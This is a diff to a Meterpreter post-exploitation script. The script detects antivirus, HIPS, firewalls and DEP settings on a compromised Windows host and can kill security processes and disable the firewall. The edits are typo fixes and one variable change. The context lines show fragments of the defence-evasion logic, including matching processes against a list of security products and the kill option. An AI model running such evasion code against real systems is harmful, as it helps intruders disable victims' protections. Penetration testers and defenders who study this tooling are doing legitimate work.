@@ -3,7 +3,7 @@
 #Meterpreter script for detecting AV, HIPS, Third Party Firewalls, DEP Configuration and Windows Firewall configuration.
 #Provides also the option to kill the processes of detected products and disable the built-in firewall. 
 #Provided by Carlos Perez at carlos_perez[at]darkoperator.com
-#Verion: 0.1.0
+#Version: 0.1.0
 session = client
 @@exec_opts = Rex::Parser::Arguments.new(
 		"-h" => [ false,  "Help menu."                        ],
@@ -247,10 +247,10 @@ avs = %W{
 	zlclient.exe
 }
 #---------------------------------------------------------------------------------------------------------
-#Function for checking for the presence of AV, HIPS and Third Party Firewalls and/or kill the processes associated to it
+#Function for checking for the presence of AV, HIPS and Third Party firewall and/or kill the processes associated to it
 def check(session,avs,killbit)
 	print_status("Checking for contermeasures...")
-	client.sys.process.get_processes().each do |x|
+	session.sys.process.get_processes().each do |x|
 		if (avs.index(x['name'].downcase))
 			print_status("\tPossible countermeasure found #{x['name']} #{x['path']}")
 			if (killbit == 1)
@@ -263,7 +263,7 @@ end
 #---------------------------------------------------------------------------------------------------------
 #Function for getting the configuration and/or disabling the built in Windows Firewall
 def checklocalfw(session,killfw)
-	# Expand enviroment %TEMP% variable
+	# Expand environment %TEMP% variable
 	tmp = session.fs.file.expand_path("%TEMP%")
 	# Create random name for the netsh output
 	fwfile = sprintf("%.5d",rand(100000))
@@ -298,7 +298,7 @@ end
 def checkdep(session)
 	tmpout = ""
 	depmode = ""
-	# Expand enviroment %TEMP% variable
+	# Expand environment %TEMP% variable
 	tmp = session.fs.file.expand_path("%TEMP%")
 	# Create random name for the wmic output
 	wmicfile = sprintf("%.5d",rand(100000))
